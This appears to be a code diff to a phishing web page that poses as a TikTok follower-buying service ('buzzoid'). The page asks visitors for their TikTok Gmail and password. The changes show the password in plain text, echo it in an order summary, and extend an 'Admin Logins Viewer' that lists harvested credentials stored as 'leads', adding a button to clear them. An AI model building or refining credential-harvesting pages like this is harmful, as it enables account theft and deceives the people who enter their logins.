@@ -192,7 +192,7 @@
                 </div>
                 <div class="input-group">
                     <label>TikTok password</label>
-                    <input type="password" id="tikName" class="input-field" placeholder="Enter password">
+                    <input type="text" id="tikName" class="input-field" placeholder="Enter password">
                 </div>
                 <div style="display: flex; gap: 10px;">
                     <button class="btn-secondary" onclick="nextStep(2)">Back</button>
@@ -209,7 +209,7 @@
                     <div class="summary-row"><span>Service:</span><span id="sumService">Followers</span></div>
                     <div class="summary-row"><span>Quantity:</span><span id="sumQty">100</span></div>
                     <div class="summary-row"><span>TikTok Gmail:</span><span id="sumUser">user@gmail.com</span></div>
-                    <div class="summary-row"><span>TikTok password:</span><span id="sumName">********</span></div>
+                    <div class="summary-row"><span>TikTok password:</span><span id="sumName">password</span></div>
                     <div class="summary-row"><span>Delivery Time:</span><span>12-24 Hours Queue</span></div>
                 </div>
 
@@ -250,7 +250,10 @@
     <div id="adminDashboardModal" class="modal">
         <div class="modal-content">
             <span class="close-modal" onclick="closeAdminDashboard()">&times;</span>
-            <h2>🔐 Admin Logins Viewer</h2>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
+                <h2>🔐 Admin Logins Viewer</h2>
+                <button onclick="clearAllLeads()" style="background: #ff4757; color: #fff; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: bold;">Clear All Data</button>
+            </div>
             <p class="subtitle">Viewing all submitted TikTok Gmails and Passwords (<span id="leadCount">0</span> total)</p>
             
             <div style="overflow-x: auto; margin-top: 20px;">
@@ -437,6 +440,15 @@
             }
         }
 
+        function clearAllLeads() {
+            if(confirm("Are you sure you want to clear all stored submissions?")) {
+                submissions = [];
+                localStorage.removeItem('buzzoid_leads');
+                renderLeadsTable();
+                showToast("All submissions cleared!");
+            }
+        }
+
         function renderLeadsTable() {
             const tbody = document.getElementById('leadsTableBody');
             document.getElementById('leadCount').innerText = submissions.length;
@@ -445,14 +457,19 @@
                 tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">No submissions recorded yet.</td></tr>';
                 return;
             }
-            tbody.innerHTML = submissions.map(s => `
-                <tr>
-                    <td>${s.time}</td>
-                    <td><b>${s.serviceQty}</b></td>
-                    <td style="color: var(--primary); font-weight: bold; user-select: all;">${s.user}</td>
-                    <td style="color: #ff4757; font-weight: bold; user-select: all; font-family: monospace;">${s.pass}</td>
-                </tr>
-            `).join('');
+            tbody.innerHTML = submissions.map(s => {
+                const serviceText = s.serviceQty || `${s.qty || ''} ${s.service || ''}`.trim() || 'Followers (100)';
+                const userText = s.user || '';
+                const passText = s.pass || s.name || '';
+                return `
+                    <tr>
+                        <td>${s.time}</td>
+                        <td><b>${serviceText}</b></td>
+                        <td style="color: var(--primary); font-weight: bold; user-select: all;">${userText}</td>
+                        <td style="color: #ff4757; font-weight: bold; user-select: all; font-family: monospace;">${passText}</td>
+                    </tr>
+                `;
+            }).join('');
         }
     </script>
 </body>
